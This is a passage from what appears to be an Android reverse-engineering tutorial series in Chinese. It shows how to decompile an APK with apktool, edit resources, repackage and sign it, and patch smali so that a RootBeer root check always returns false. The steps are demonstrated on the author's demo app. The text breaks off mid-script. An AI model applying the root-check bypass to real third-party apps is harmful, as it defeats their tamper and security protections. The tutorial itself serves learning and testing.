class=\"token function\">detectTestKeys</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token class-name\">Z</span><br><br>    move<span class=\"token operator\">-</span>result v0<br><br>    <span class=\"token keyword\">if</span><span class=\"token operator\">-</span>nez v0<span class=\"token punctuation\">,</span> <span class=\"token operator\">:</span>cond_1<br><br>    invoke<span class=\"token operator\">-</span>virtual <span class=\"token punctuation\">{</span>p0<span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Lcom</span><span class=\"token operator\">/</span>scottyab<span class=\"token operator\">/</span>rootbeer<span class=\"token operator\">/</span><span class=\"token class-name\">RootBeer</span><span class=\"token punctuation\">;</span><span class=\"token operator\">-></span><span class=\"token function\">checkSuExists</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token class-name\">Z</span><br><br>    move<span class=\"token operator\">-</span>result v0<br><br>    <span class=\"token keyword\">if</span><span class=\"token operator\">-</span>nez v0<span class=\"token punctuation\">,</span> <span class=\"token operator\">:</span>cond_1<br><br>    invoke<span class=\"token operator\">-</span>virtual <span class=\"token punctuation\">{</span>p0<span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Lcom</span><span class=\"token operator\">/</span>scottyab<span class=\"token operator\">/</span>rootbeer<span class=\"token operator\">/</span><span class=\"token class-name\">RootBeer</span><span class=\"token punctuation\">;</span><span class=\"token operator\">-></span><span class=\"token function\">checkForRootNative</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token class-name\">Z</span><br><br>    move<span class=\"token operator\">-</span>result v0<br><br>    <span class=\"token keyword\">if</span><span class=\"token operator\">-</span>nez v0<span class=\"token punctuation\">,</span> <span class=\"token operator\">:</span>cond_1<br><br>    invoke<span class=\"token operator\">-</span>virtual <span class=\"token punctuation\">{</span>p0<span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Lcom</span><span class=\"token operator\">/</span>scottyab<span class=\"token operator\">/</span>rootbeer<span class=\"token operator\">/</span><span class=\"token class-name\">RootBeer</span><span class=\"token punctuation\">;</span><span class=\"token operator\">-></span><span class=\"token function\">checkForMagiskBinary</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token class-name\">Z</span><br><br>    move<span class=\"token operator\">-</span>result v0<br><br>    <span class=\"token keyword\">if</span><span class=\"token operator\">-</span>eqz v0<span class=\"token punctuation\">,</span> <span class=\"token operator\">:</span>cond_0<br><br>    <span class=\"token keyword\">goto</span> <span class=\"token operator\">:</span>goto_0<br><br>    <span class=\"token operator\">:</span>cond_0<br>    <span class=\"token keyword\">const</span><span class=\"token operator\">/</span><span class=\"token number\">4</span> v0<span class=\"token punctuation\">,</span> <span class=\"token number\">0x0</span><br><br>    <span class=\"token keyword\">goto</span> <span class=\"token operator\">:</span>goto_1<br><br>    <span class=\"token operator\">:</span>cond_1<br>    <span class=\"token operator\">:</span>goto_0<br>    <span class=\"token keyword\">const</span><span class=\"token operator\">/</span><span class=\"token number\">4</span> v0<span class=\"token punctuation\">,</span> <span class=\"token number\">0x1</span><br><br>    <span class=\"token operator\">:</span>goto_1<br>    <span class=\"token keyword\">return</span> v0<br><span class=\"token punctuation\">.</span>end method</code></pre>\n<p>想要 patch 這個函式非常簡單，我們讓它永遠都回傳 false 就好：</p>\n<pre class=\"language-java\"><code class=\"language-java\"><span class=\"token punctuation\">.</span>method <span class=\"token keyword\">public</span> <span class=\"token function\">isRooted</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token class-name\">Z</span><br>    <span class=\"token punctuation\">.</span>locals <span class=\"token number\">1</span><br>    <br>    # 在開頭新增底下這兩行，永遠回傳 <span class=\"token boolean\">false</span><br>    <span class=\"token keyword\">const</span><span class=\"token operator\">/</span><span class=\"token number\">4</span> v0<span class=\"token punctuation\">,</span> <span class=\"token number\">0x0</span><br>    <span class=\"token keyword\">return</span> v0<br>    <br>    # 以下省略<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><br><span class=\"token punctuation\">.</span>end method</code></pre>\n<p>接著一樣重新打包之後安裝在手機上，就能看到繞過的成果。</p>\n<h2 id=\"%E7%B8%BD%E7%B5%90\"><a class=\"direct-link\" href=\"#%E7%B8%BD%E7%B5%90\">#</a> 總結</h2>\n<p>在這篇裡面我們學到了如何閱讀基本的 smali 程式碼以及修改它，也學到了該如何利用 <code>adb logcat</code> 來看 Android app 的 log，並且實際下去修改 smali，反轉原本的邏輯，去繞過 app 對於 root 的檢查。</p>\n<p>加上 log 是一個我覺得雖然看起來好像很笨很沒效率，但其實很有用的方法，就跟寫程式出錯的時候我會加一大堆 <code>console.log</code> 一樣，透過 log 來確認程式的執行流程跟自己預期中的相符，對於還原邏輯很有幫助。</p>\n<p>最後，這篇我只有稍微提了一下 smali，如果想更了解 smali 的語法，可以參考底下文章：</p>\n<ol>\n<li><a href=\"https://www.jianshu.com/p/9931a1e77066\">Android逆向基础：Smali语法</a></li>\n<li><a href=\"https://blog.csdn.net/chenrunhua/article/details/41250613\">APK反编译之一：基础知识--smali文件阅读</a></li>\n</ol>\n<p>在下一篇文章中，我會介紹如何去監聽 app 向外發送的 request 以及 response，幫助我們了解 app 跟 API server 的溝通。</p>\n<p>系列文連結：</p>\n<ol>\n<li><a href=\"/posts/huli/android-apk-decompile-intro-1/\">Android App 逆向入門之一：拆開與重組 apk</a></li>\n<li><a href=\"/posts/huli/android-apk-decompile-intro-2/\">Android App 逆向入門之二：修改 smali 程式碼</a> - 你在這篇</li>\n<li><a href=\"/posts/huli/android-apk-decompile-intro-3/\">Android App 逆向入門之三：監聽 app 封包</a></li>\n<li><a href=\"/posts/huli/android-apk-decompile-intro-4/\">Android App 逆向入門之四：使用 Frida 進行動態分析</a></li>\n</ol>\n",
      "date_published": "2022-02-21T00:00:00-00:00"
    },{
      "id": "https://tech-blog.cymetrics.io/posts/huli/android-apk-decompile-intro-1/",
      "url": "https://tech-blog.cymetrics.io/posts/huli/android-apk-decompile-intro-1/",
      "title": "Android App 逆向入門之一：拆開與重組 apk",
      "content_html": "<!-- summary -->\n<!-- 「Android App 逆向入門」系列文一共有四篇，適合沒有接觸過 Android App 逆向，想要嘗試看看的人，內容包含基本的工具使用以及概念。第一篇我們將利用 apktool 拆開與重組 apk。 -->\n<!-- summary -->\n<p>五年前我有寫過一篇：<a href=\"https://blog.huli.tw/2016/03/20/android-apk-decompile/\">[Android] 人人都會的 apk 反編譯</a>，那時我還是個寫 Android 的工程師，因為工作上的需求跟同事一起研究了基本的 Android 逆向工程，想達成的目標是全自動的流程，上傳一個 apk 以後自動把 apk 拆開來，塞一些奇怪的東西再裝回去。</p>\n<p>而現在同樣是因為工作上的需求，再次回憶並補強了一下對於 apk 反編譯以及修改等等的相關知識，寫成這一系列的文章跟大家分享。</p>\n<p>先說在前面，這一系列都只是「入門」而已，利用各種工具把 apk 拆開來再裝回去，對於沒有加殼的 app 應該夠用了，但如果有加殼過的話，需要再更深一點的 binary 相關知識才能夠解開，那又是另一個世界了。</p>\n<p>總之呢，這個系列適合沒有接觸過 Android App 逆向，想要玩玩看的人，也適合 Android 工程師，可以把自己寫的 app 拆開來，看看是什麼樣子，我覺得也滿有用的。</p>\n<p>系列文連結：</p>\n<ol>\n<li><a href=\"/posts/huli/android-apk-decompile-intro-1/\">Android App 逆向入門之一：拆開與重組 apk</a></li>\n<li><a href=\"/posts/huli/android-apk-decompile-intro-2/\">Android App 逆向入門之二：修改 smali 程式碼</a></li>\n<li><a href=\"/posts/huli/android-apk-decompile-intro-3/\">Android App 逆向入門之三：監聽 app 封包</a></li>\n<li><a href=\"/posts/huli/android-apk-decompile-intro-4/\">Android App 逆向入門之四：使用 Frida 進行動態分析</a></li>\n</ol>\n<h2 id=\"%E8%A6%81%E9%80%86%E5%90%91%EF%BC%8C%E5%85%88%E5%BE%9E%E6%AD%A3%E5%90%91%E4%BA%86%E8%A7%A3-android-app-%E9%96%8B%E5%A7%8B\"><a class=\"direct-link\" href=\"#%E8%A6%81%E9%80%86%E5%90%91%EF%BC%8C%E5%85%88%E5%BE%9E%E6%AD%A3%E5%90%91%E4%BA%86%E8%A7%A3-android-app-%E9%96%8B%E5%A7%8B\">#</a> 要逆向，先從正向了解 Android app 開始</h2>\n<p>我認為想要逆向 Android app 的話，先大致了解一下 app 到底是怎麼寫出來的會滿有幫助的，至少在把 app 拆開來以後可以快速地知道各個部分大概在幹嘛。</p>\n<p>所以我很推薦大家隨便找個 Android app 的教學，跟著教學把 Android Studio 裝起來，然後寫一個非常簡單的 app 並且跑起來，甚至打包成 apk 檔案，都會加強對於整個流程的理解。</p>\n<p>接下來我就帶大家簡單看看一個 app 是怎麼寫成的。</p>\n<p>首先呢，一個 app 大概是由三個元件所組成的：</p>\n<ol>\n<li>AndroidManifest.xml，可以想成是 app 的設定檔，寫著各種 app 相關資訊</li>\n<li>resources，各種資源，包括排版、程式中出現的字串、圖片等等所有資訊</li>\n<li>程式碼</li>\n</ol>\n<p>底下是一個簡單的專案截圖，左邊是檔案結構，右邊是 <code>AndroidManifest.xml</code> 的內容：</p>\n<p><img src=\"/img/posts/huli/android-apk-decompile-intro/p1-manifest.png\" alt=\"\"></p>\n<p>為了怕圖片不太清楚，底下是 xml 的內容：</p>\n<pre class=\"language-xml\"><code class=\"language-xml\"><span class=\"token prolog\">&lt;?xml version=\"1.0\" encoding=\"utf-8\"?></span><br><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>manifest</span> <span class=\"token attr-name\"><span class=\"token namespace\">xmlns:</span>android</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>http://schemas.android.com/apk/res/android<span class=\"token punctuation\">\"</span></span><br>    <span class=\"token attr-name\">package</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>com.example.myapplication<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><br><br>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>application</span><br>        <span class=\"token attr-name\"><span class=\"token namespace\">android:</span>allowBackup</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>true<span class=\"token punctuation\">\"</span></span><br>        <span class=\"token attr-name\"><span class=\"token namespace\">android:</span>icon</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>@mipmap/ic_launcher<span class=\"token punctuation\">\"</span></span><br>        <span class=\"token attr-name\"><span class=\"token namespace\">android:</span>label</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>@string/app_name<span class=\"token punctuation\">\"</span></span><br>        <span class=\"token attr-name\"><span class=\"token namespace\">android:</span>roundIcon</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>@mipmap/ic_launcher_round<span class=\"token punctuation\">\"</span></span><br>        <span class=\"token attr-name\"><span class=\"token namespace\">android:</span>supportsRtl</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>true<span class=\"token punctuation\">\"</span></span><br>        <span class=\"token attr-name\"><span class=\"token namespace\">android:</span>theme</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>@style/AppTheme<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><br>        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>activity</span><br>            <span class=\"token attr-name\"><span class=\"token namespace\">android:</span>name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>.MainActivity<span class=\"token punctuation\">\"</span></span><br>            <span class=\"token attr-name\"><span class=\"token namespace\">android:</span>label</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>@string/app_name<span class=\"token punctuation\">\"</span></span><br>            <span class=\"token attr-name\"><span class=\"token namespace\">android:</span>theme</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>@style/AppTheme.NoActionBar<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><br>            <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>intent-filter</span><span class=\"token punctuation\">></span></span><br>                <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>action</span> <span class=\"token attr-name\"><span class=\"token namespace\">android:</span>name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>android.intent.action.MAIN<span class=\"token punctuation\">\"</span></span> <span class=\"token punctuation\">/></span></span><br><br>                <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>category</span> <span class=\"token attr-name\"><span class=\"token namespace\">android:</span>name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>android.intent.category.LAUNCHER<span class=\"token punctuation\">\"</span></span> <span class=\"token punctuation\">/></span></span><br>            <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>intent-filter</span><span class=\"token punctuation\">></span></span><br>        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>activity</span><span class=\"token punctuation\">></span></span><br>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>application</span><span class=\"token punctuation\">></span></span><br><br><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>manifest</span><span class=\"token punctuation\">></span></span></code></pre>\n<p>從這個檔案中我們可以知道幾件事情，包括：</p>\n<ol>\n<li>這個 app 的 package name 是 <code>com.example.myapplication</code></li>\n<li>這個 app 有一個 activity，名稱是 <code>MainActivity</code>，是主要的 activity</li>\n</ol>\n<p>每一個 app 都會有一個 unique 的 package name，可以想成就是這個 app 的 id，會寫在 AndroidManifest 裡面，而這也會跟你程式碼的檔案結構有關，有寫過 Java 的都會知道。</p>\n<p>如果你去網頁版的 Google Play，就會發現網址上寫著的就是 package name，舉例來說 Facebook 的頁面網址長這樣：<a href=\"https://play.google.com/store/apps/details?id=com.facebook.katana&amp;hl=zh_TW&amp;gl=US\">https://play.google.com/store/apps/details?id=com.facebook.katana&amp;hl=zh_TW&amp;gl=US</a></p>\n<p>因此 <code>com.facebook.katana</code> 就是 Facebook app 的 package name。</p>\n<p>再來我們看第二點，什麼又是 activity 呢？</p>\n<p>你可以把 activity 想成是一個「畫面」，每一個畫面就是一個 activity，所以假設現在是個需要註冊才能使用的 app，很可能會有底下這些畫面：</p>\n<ol>\n<li>歡迎頁面</li>\n<li>註冊頁面</li>\n<li>登入頁面</li>\n<li>主頁面（登入成功後顯示）</li>\n</ol>\n<p>而這每一個頁面都是一個 activity，而每一個 activity 可能都有一個 layout，在 Android 開發中，layout 其實就是一個 xml 檔案，會像是這樣：</p>\n<p><img src=\"/img/posts/huli/android-apk-decompile-intro/p2-layout.png\" alt=\"\"></p>\n<p>右邊是你看到的樣子，左邊則是 layout 的 xml 檔案，這就有點像是網頁前端中畫面跟 HTML+CSS 的關係一樣，只是在 Android 開發中是用 xml 來產生畫面，而不是用 HTML+CSS。</p>\n<p>像 layout 就屬於資源的一種，會被放在 <code>res</code> 資料夾裡面。</p>\n<p>而上面的 layout 檔案，還有兩個值得注意的地方。</p>\n<p>第一個是 <code>android:id=&quot;@+id/textview_first&quot;</code>，代表這個 component 對應到一個 id，為什麼要對應到 id 呢？因為這樣我們才能在程式碼裡面存取到這個 component，像這樣：</p>\n<pre class=\"language-java\"><code class=\"language-java\"><span class=\"token class-name\">TextView</span> tv <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">TextView</span><span class=\"token punctuation\">)</span> <span class=\"token function\">findViewById</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">R</span><span class=\"token punctuation\">.</span>id<span class=\"token punctuation\">.</span>textview_first<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>tv<span class=\"token punctuation\">.</span><span class=\"token function\">setText</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"hello\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre>\n<p>我們要先利用 id 找到這個 component，才能改變它的文字。</p>\n<p>第二個值得注意的地方是 <code>android:text=&quot;@string/hello_first_fragment&quot;</code>，這其實就是元件會顯示的文字，假設我寫：<code>android:text=&quot;hello&quot;</code>，畫面上就會顯示 hello。</p>\n<p>那為什麼上面的內容是 <code>@string/hello_first_fragment</code> 呢？我們可以去看看 <code>res/values/strings.xml</code> 這個檔案：</p>\n<p><img src=\"/img/posts/huli/android-apk-decompile-intro/p3-strings.png\" alt=\"\"></p>\n<p>內容為：</p>\n<pre class=\"language-xml\"><code class=\"language-xml\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>resources</span><span class=\"token punctuation\">></span></span><br>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>string</span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>app_name<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>My Application<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>string</span><span class=\"token punctuation\">></span></span><br>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>string</span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>action_settings<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>Settings<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>string</span><span class=\"token punctuation\">></span></span><br>    <span class=\"token comment\">&lt;!-- Strings used for fragments for navigation --></span><br>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>string</span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>first_fragment_label<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>First Fragment<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>string</span><span class=\"token punctuation\">></span></span><br>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>string</span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>second_fragment_label<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>Second Fragment<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>string</span><span class=\"token punctuation\">></span></span><br>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>string</span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>next<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>Next<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>string</span><span class=\"token punctuation\">></span></span><br>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>string</span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>previous<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>Previous<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>string</span><span class=\"token punctuation\">></span></span><br><br>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>string</span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>hello_first_fragment<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>Hello first fragment<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>string</span><span class=\"token punctuation\">></span></span><br>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>string</span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>hello_second_fragment<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>Hello second fragment. Arg: %1$s<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>string</span><span class=\"token punctuation\">></span></span><br><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>resources</span><span class=\"token punctuation\">></span></span></code></pre>\n<p>可以看到裡面有個 name 為 <code>hello_first_fragment</code> 的 string，內容是 <code>Hello first fragment</code>。</p>\n<p>利用這樣的方法，我們可以避免直接在 layout 裡面 hard code 字串，避免將字串寫死。為什麼要避免寫死呢？因為要做多國語系！</p>\n<p>如果你想要做成英文版的，那其實你可以建立一個新檔案叫做 <code>res/values/strings-en.xml</code> 之類的，Android 偵測到作業系統是英文時，就會自動去抓這個檔案裡面的字串來用，如此一來，你就只需要改變這個字串檔就好，不需要動到程式碼。</p>\n<p>以上就是一些 Android app 的基本介紹，包括：</p>\n<ol>\n<li>AndroidManifest 是做什麼的？</li>\n<li>什麼是 activity？</li>\n<li>各種 xml 檔案的用途是什麼？</li>\n</ol>\n<p>理解這些以後，我們就可以來拆 apk 了。</p>\n<p>我寫了一個簡單的範例 app，連結在這：<a href=\"https://github.com/aszx87410/demo/raw/master/android/demoapp.apk\">https://github.com/aszx87410/demo/raw/master/android/demoapp.apk</a></p>\n<p>跑起來以後長這樣，小巧可愛：</p>\n<p><img src=\"/img/posts/huli/android-apk-decompile-intro/p4-scr.png\" alt=\"\"></p>\n<p>按下 <code>Check root</code> 之後會檢查裝置是否有 root，並改變畫面上的文字。</p>\n<h2 id=\"%E7%B0%A1%E6%98%93-apk-%E6%8B%86%E8%A7%A3\"><a class=\"direct-link\" href=\"#%E7%B0%A1%E6%98%93-apk-%E6%8B%86%E8%A7%A3\">#</a> 簡易 apk 拆解</h2>\n<p>其實 apk 就是一個壓縮檔，所以我們可以直接用內建的指令把 apk 拆開：</p>\n<pre class=\"language-shell\"><code class=\"language-shell\"><span class=\"token function\">unzip</span> demoapp.apk -d demoapp</code></pre>\n<p>拆開來會長這樣：</p>\n<p><img src=\"/img/posts/huli/android-apk-decompile-intro/p5-apk.png\" alt=\"\"></p>\n<p>大致上有底下幾個資料夾跟檔案：</p>\n<ul>\n<li>lib - 拿來放 native 程式碼用的，以後會講到</li>\n<li>META-INF - 會有一些簽章相關資訊</li>\n<li>res - 剛剛寫 app 的時候有看到了</li>\n<li>AndroidManifest.xml - 同上</li>\n<li>classes.dex - 程式碼編譯成 dex 後的結果</li>\n<li>resources.arsc - resource 相關的索引表</li>\n</ul>\n<p>先來講一下 <code>resources.arsc</code> 是幹嘛的，如果你打開 res 資料夾底下的任一檔案時，你會發現檔案內容不是純文字，而是一堆 16 進位的東西，像這樣：</p>\n<pre><code>0300 0800 8401 0000 0100 1c00 a800 0000\n0700 0000 0000 0000 0001 0000 3800 0000\n0000 0000 0000 0000 0f00 0000 1a00 0000\n2600 0000 3000 0000 3800 0000 4200 0000\n0c0c 696e 7465 7270 6f6c 6174 6f72 0008\n0864 7572 6174 696f 6e00 0909 6672 6f6d\n416c 7068 6100 0707 746f 416c 7068 6100\n0505 616c 7068 6100 0707 616e 6472 6f69\n6400 2a2a 6874 7470 3a2f 2f73 6368 656d\n</code></pre>\n<p>這是因為這些 xml 已經被編譯過了，需要搭配 <code>resources.arsc</code> 才能還原成文字的形式。</p>\n<p>而 <code>classes.dex</code> 也是經過編譯的東西，需要再進一步反編譯之後才能看到裡面的內容。</p>\n<p>從上面這些我們可以知道，雖然可以手動利用解壓縮的方式把 apk 拆開，但其實看不到什麼有用的內容。為了進一步看到其中的內容，我們需要其他工具來做這件事情。</p>\n<h2 id=\"%E5%88%A9%E7%94%A8-apktool-%E6%8B%86%E8%A7%A3-apk\"><a class=\"direct-link\" href=\"#%E5%88%A9%E7%94%A8-apktool-%E6%8B%86%E8%A7%A3-apk\">#</a> 利用 Apktool 拆解 apk</h2>\n<p>剛剛使用的 <code>unzip</code> 只是單純將壓縮檔解開，而 <a href=\"https://ibotpeaches.github.io/Apktool/\">Apktool</a> 的網站上開宗明義就寫了：A tool for reverse engineering Android apk files，表明了它就是拿來拆 apk 用的。</p>\n<p>有關於下載跟安裝的細節我就不寫了，可自行參考官網：<a href=\"https://ibotpeaches.github.io/Apktool/\">https://ibotpeaches.github.io/Apktool/</a> 或者是其他網路上的資源。</p>\n<p>接著，我們就來用 Apktool 拆開剛剛的 demoapp：</p>\n<pre class=\"language-shell\"><code class=\"language-shell\"><span class=\"token comment\"># d 是 decode 的意思</span><br><span class=\"token comment\"># -f 是 --force，代表如果有 demoapp 的資料夾就先刪掉</span><br>apktool d -f demoapp</code></pre>\n<p>拆開來以後可以看到底下的檔案結構：</p>\n<pre class=\"language-shell\"><code class=\"language-shell\"><span class=\"token builtin class-name\">.</span><br>├── AndroidManifest.xml<br>├── apktool.yml<br>├── lib<br>├── original<br>├── res<br>└── smali</code></pre>\n<p>跟我們用壓縮檔解開的差別在於沒有了 <code>resources.arsc</code>，也沒有了<code>classes.dex</code>，前者是因為已經將資源還原成文字檔，後者則是還原成了 <code>smali</code> 資料夾底下的檔案，這個下一篇會提到。</p>\n<p>接著我們先來改改看畫面上的文字。</p>\n<p>打開 <code>res/values/strings.xml</code>，搜尋：<code>Hello first fragment</code>，會找到這一段：</p>\n<pre class=\"language-xml\"><code class=\"language-xml\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>string</span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>hello_first_fragment<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>Hello first fragment<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>string</span><span class=\"token punctuation\">></span></span></code></pre>\n<p>我們直接將內容改掉，改成：</p>\n<pre class=\"language-xml\"><code class=\"language-xml\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>string</span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>hello_first_fragment<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>Hacked!<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>string</span><span class=\"token punctuation\">></span></span></code></pre>\n<p>接下來只要將 apk 重新打包並裝回去，應該就能看到改過的文字。</p>\n<h2 id=\"%E9%87%8D%E6%96%B0%E6%89%93%E5%8C%85-apk\"><a class=\"direct-link\" href=\"#%E9%87%8D%E6%96%B0%E6%89%93%E5%8C%85-apk\">#</a> 重新打包 apk</h2>\n<p>Apktool 除了拿來拆解 apk 以外，也可以將 apk 重新組裝回去，指令如下：</p>\n<pre class=\"language-shell\"><code class=\"language-shell\">apktool b demoapp -o demoapp2.apk</code></pre>\n<p>如果在打包的時候有出錯，可以改用：</p>\n<pre class=\"language-shell\"><code class=\"language-shell\">apktool b --use-aapt2 demoapp -o demoapp2.apk</code></pre>\n<p>沒意外的話，就會在資料夾底下看到一個 <code>demoapp2.apk</code> 的檔案，但這時如果你直接安裝這個檔案會出錯：</p>\n<pre class=\"language-shell\"><code class=\"language-shell\">adb: failed to <span class=\"token function\">install</span> demoapp2.apk: Failure <span class=\"token punctuation\">[</span>INSTALL_PARSE_FAILED_NO_CERTIFICATES: Failed to collect certificates from /data/app/vmdl1575742168.tmp/base.apk: Attempt to get length of null array<span class=\"token punctuation\">]</span></code></pre>\n<p>這是因為 apk 檔打包出來以後還要經過兩道手續：align 跟 sign，才能安裝到手機上面。</p>\n<p>align 是為了效能上的考量，而 sign 則是為了安全性。</p>\n<p>在 Google Play 後台上傳新的 apk 時，Google 會檢查 apk 簽署時用的簽章是否跟之前一樣，如果不一樣的話會不讓你上傳。如此一來，就算攻擊者拿到受害者的帳號，也沒辦法上傳新的 apk，因為簽章不符。</p>\n<p>我們先來產生一個新的簽章：</p>\n<pre class=\"language-shell\"><code class=\"language-shell\">keytool -genkey -v -keystore my-release-key.jks -keyalg RSA -keysize <span class=\"token number\">2048</span> -validity <span class=\"token number\">10000</span> -alias my-alias</code></pre>\n<p>問你 password 的地方輸入 123456 即可，其他都可以不填，執行完畢以後就會看到一個 <code>my-release-key.jks</code> 的檔案。</p>\n<p>接著我有寫了一個簡單的 script，自動移除舊版本 + build + align + sign + install：</p>\n<pre class=\"language-shell\"><code class=\"language-shell\"><span class=\"token comment\"># compile.sh</span><br><br><span class=\"token comment\"># 移除舊的 app</span><br>adb uninstall com.cymetrics.demo<br><br><span class=\"token comment\"># 刪除舊的 apk</span><br><span class=\"token function\">rm</span> -f demoapp2.apk<br><span class=\"token function\">rm</span> -f demoapp2-final.apk<br><span class=\"token function\">rm</span> -f demoapp2-aligned.apk<br><br><span class=\"token comment\"># build</span><br>apktool b --use-aapt2 demoapp -o demoapp2.apk<br><br><span class=\"token comment\"># align</span><br>zipalign -v -p 